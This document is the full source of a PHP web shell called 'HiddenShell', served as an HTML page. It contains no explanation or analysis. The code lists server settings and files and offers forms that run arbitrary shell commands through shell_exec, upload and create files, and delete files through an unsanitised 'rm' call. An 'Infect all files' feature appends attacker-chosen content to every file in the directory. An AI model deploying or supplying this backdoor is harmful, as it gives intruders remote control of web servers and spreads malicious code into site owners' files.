<html>
  <head>
    <title>HiddenShell</title>
  </head>
    <body>
	
	  <style>
	    body {
	      background-color: #000000;
		  color: #CCCCCC;
		  font-family: system, sans-serif;
	    }
		a {
		  color: #ADFF2F;
		}
		a:hover {
		  color: #FF0000;
		}
		#v {
		  background-color: #262626;
		}
	  </style>
	
	<?php
	
	global $page;
     $page = $_SERVER['PHP_SELF'];
	
	?>
	
	<center>
	  <h1>..:: HiddenShell ::..</h1>
	</center>
	  <h3><a href="http://www.damncode.net" title="DamnCode.net">http://www.damncode.net</a>
	    <br />
	    <br />
	<table width='100%'>
      <tr>
          Safe Mode: <font color="#6495ED">
		  
		  <?php
		  
		  $safe_mode = ini_get('safe_mode');

		  if($safe_mode == 0) {
		    echo "<font color='lightgreen'>OFF</font>";
		  }
		  else {
		    echo "<font color='#FF0000'>ON</font>";
		  }
		  
		  ?>
		  
		  </font>
      </tr>
	    <br />
      <tr>
          Magic Quote: <font color="#6495ED">
		  
		  <?php
		  
		  error_reporting(0);
		  
		  if(get_magic_quotes_gpc() == 0) {
		    echo "<font color='lightgreen'>OFF</font>";
		  }
		  else {
		    echo "<font color='#FF0000'>ON</font>";
		  }
		  
		  ?>
		  
		  </font>
      </tr>
	    <br />
      <tr>
          Server name: <font color="#6495ED"><?php echo $_SERVER['SERVER_NAME'] ?></font>
      </tr>
	    <br />
	  <tr>
		  Server software: <font color="#6495ED"><?php echo $_SERVER['SERVER_SOFTWARE'] ?></font>
      </tr>
	    <br />
	  <tr>
		  Current Dir: <font color="#6495ED"><?php echo getcwd() ?></font>
	  </tr>
		  
		  <hr />
		  
	    <td>
		  Files list: <font color="#6495ED">
		  
		  <?php
		  

		  echo "<br /><br />";

		  if($handle = opendir(getcwd())) {
		  
		    echo "
			
			<tr>
			  <td><font color='#FF0000'>DIR/FILE</font></td>
		  	    <td><font color='#FF0000'>File</font></td>
		  	      <td><font color='#FF0000'>File Size</font></td>
			        <td><font color='#FF0000'>File Perms</font></td>
			</tr>";
			
			  while(false !== ($file = readdir($handle))) {
			  
			    echo "
				
		    	<tr>
			      <td width='10%'><font color='#87CEEB'><b>".strtoupper(filetype($file))."</b></font></td>
				    <td width='10%'><a href='$file' target='_blank'>".$file."</a></td>
			          <td width='10%'>".filesize($file)." byte</td>
			            <td width='10%'>".fileperms($file)."</td>
 			    </tr>";
			  
			  }
			  
			closedir($handle);
	      }

		  ?>
		  
		  </font>
	    </td>
	  </tr>
	  
	</table>
	
	<br />
	
	  <hr />
	
	<table>

	  <tr>
	    <td id='v'>
		 <center>
		  <form action='' method='post' enctype='multipart/form-data'>
			Upload a file
		      <br />
		      <br />
			<input type='file' name='file' />
		      <br />
			<input type='submit' value='Load' />
		  </form>
		 </center>
		</td>
		
	    <td>
		 <center>
		  <form action="" method='get'>
			Shell
		      <br />
		      <br />
			<input type='input' name='shell' />
		      <br />
			<input type='submit' value='Exec' />
		  </form>
		 </center>
		</td>
		
	    <td id='v'>
		 <center>
		  <form action="" method='get'>
			Infect all files
		      <br />
		      <br />
			<input type='input' name='infect' />
		      <br />
			<input type='submit' value='Infect' />
		  </form>
		 </center>
		</td>
		
		<td>
		  <center>
		  Delete a file
			    <br />
			    <br />
		    <form action='' method='post'>
			  <input type='text' name='to_eliminate' />
			    <br />
			  <input type='submit' value='Delete' />
			</form>
		  </center>
		</td>
		
	  </tr>
	  
	  <tr>
	    <td>
	  <center>
		Create a file
		  <form action='' method='post'>
		    <input type='text' name='name' value='Name of the file' />
			 <br />
		    <textarea cols='40' rows='20' name='create'>Text of the file</textarea>
			 <br />
			<input type='submit' value='Create' />
		  </form>
		<td>
	  </center>
	  </tr>
	
	</table>
	
	<?php
	
     /* Shell */
	 
	 if($cmd = $_GET['shell']) {
	 
	 $output = shell_exec($cmd);
	 
	 $output = str_replace("\n", "<br />", $output);
	 
      echo "<tr><td>".$output."</td></tr>";
	 }
	 
	  /* File Upload */
	  
	  if($file = $_FILES['file']['tmp_name']) {
	  
        $name = basename($_FILES['file']['name']);
   
        move_uploaded_file($file, $name);
   
        header("Location: $page");
	 }
	 
	 /* Infect */

	 if($handle = opendir(getcwd())) {
	 
	   if($infection = $_GET['infect']) {
	 
	     while(false !== ($file = readdir($handle))) {
	 
	       $to_infect = fopen($file, 'a');
	       fwrite($to_infect, $infection);
	       fclose($to_infect);
   
            header("Location: $page");
	 
	     }
	   }
	 
	   closedir($handle);
	 }
	 
	 /* Create */
	 
	 if($filename = $_POST['name']) {
	   $content = $_POST['create'];
	   $to_create = fopen($filename, 'w');
	   fwrite($to_create, $create);
	   fclose($file);
   
        header("Location: $page");
	 
	 }
	 
	 /* Delete a file */
	 
	 if($file_to_eliminate = $_POST['to_eliminate']) {
	   shell_exec("rm ".$file_to_eliminate);
   
        header("Location: $page");
	 
	 }
	 
	 ?>
	
	</body>
</html>